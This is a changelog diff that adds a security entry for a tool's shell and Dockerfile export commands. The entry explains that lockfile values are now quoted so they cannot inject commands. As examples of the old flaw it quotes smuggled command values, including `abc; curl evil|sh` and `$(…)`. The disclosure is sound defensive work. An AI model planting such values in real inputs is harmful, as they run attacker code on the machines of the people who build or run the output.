@@ -42,6 +42,20 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   `import` subcommands.
 - `pyproject.toml` / `__init__.py` bumped to `0.4.0`.
 
+### Security
+
+- `export --format shell` and `export --format dockerfile` now POSIX-shell-quote
+  every value read from the (untrusted, shared) lockfile — core/node commits,
+  git and model URLs, paths, hashes and the workflow name. Because the generated
+  `install.sh` is executed and the `Dockerfile` is built (including the model
+  lines the template invites users to uncomment), a malicious lock could
+  previously inject commands: a `comfyui` commit of `abc; curl evil|sh`, a model
+  url of `$(…)`, or a `"`-breakout in a double-quoted argument all ran on the
+  consumer's machine. Values are now emitted as inert single-quoted arguments,
+  and the Dockerfile generator additionally collapses CR/LF so a newline cannot
+  break a value out of its line into a fresh (attacker-chosen) instruction.
+  Benign URLs/commits/paths are unaffected (the safe charset stays unquoted).
+
 ## [0.3.0] - 2026-06-24
 
 ### Added
